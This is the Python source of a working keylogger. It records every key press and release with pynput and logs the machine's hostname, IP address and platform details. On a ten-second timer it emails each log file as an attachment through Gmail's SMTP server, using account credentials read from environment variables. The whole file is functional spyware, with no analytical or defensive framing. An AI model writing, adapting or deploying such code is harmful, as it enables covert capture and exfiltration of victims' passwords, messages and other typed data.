import logging
import socket
import platform
import os
import threading
import smtplib
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate, COMMASPACE
from email.mime.application import MIMEApplication
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

class KeyLogger():
    def __init__(self, interval, stop) -> None:
        self.interval = interval
        self.stop = stop
        self.start_time = datetime.now()
        self.end_time = datetime.now()
        self.log_number = 0
        self.create_log_dir()

    def create_log_dir(self):
        if not os.path.exists("logs"):
            os.makedirs("logs")
    
    def update_filename(self):
        format_data = "%d-%m-%y-%H-%M-%S.%f"
        start_time_str = datetime.strftime(self.start_time, format_data)
        end_time_str = datetime.strftime(self.end_time, format_data)
        self.filename = f"keylog-{start_time_str}_{end_time_str}"

    def config_logger(self):
        log = logging.getLogger()
        for handler in log.handlers:
            if isinstance(handler, logging.FileHandler):
                log.removeHandler(handler)
    
        file_handler = logging.FileHandler(f"logs/{self.filename}.log", "a")
        formatter = logging.Formatter('%(asctime)s : %(message)s')
        file_handler.setFormatter(formatter)
        log.addHandler(file_handler)
        log.setLevel(logging.INFO)

    def on_press(self, key):
        logging.info(f"[PRESSED]: {key}")
    
    def on_release(self, key):
        logging.info(f"[RELEASED]: {key}")
        if key == keyboard.Key.esc and self.stop == True:
            return False
    
    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        logging.info("(SYSTEM INFORMATION)")
        logging.info(f"hostname: {hostname}")
        logging.info(f"ip: {ip}")
        logging.info(f"processor: {platform.processor()}")
        logging.info(f"system: {platform.system()}")
        logging.info(f"machine: {platform.machine()}")
        logging.info(f"release: {platform.release()}")
        logging.info(f"architecture: {platform.architecture()}\n")

    def send_mail(self):
        email = os.getenv("EMAIL")
        password = os.getenv("PASSWORD")

        message = MIMEMultipart()
        message["From"] = email
        message["To"] = COMMASPACE.join([email])
        message["Subject"] = "Keylogs"
        message["Date"] = formatdate(localtime=True)

        file = f"logs/{self.filename}.log"        
        with open(file, "rb") as f:
            part = MIMEApplication(
                f.read(),
                name=os.path.basename(file)
            )
        part["Content-Disposition"] = 'attachment; filename="%s"' % os.path.basename(file)
        message.attach(part)

        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message.as_string())

    def report(self):
        self.end_time = datetime.now()
        if self.log_number > 0:
            self.send_mail()
            pass
        self.log_number += 1
        self.update_filename()
        self.start_time = datetime.now()
        self.config_logger()
        self.system_information()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        with keyboard_listener:
            self.start_time = datetime.now()
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(10, True)
    keylogger.run()
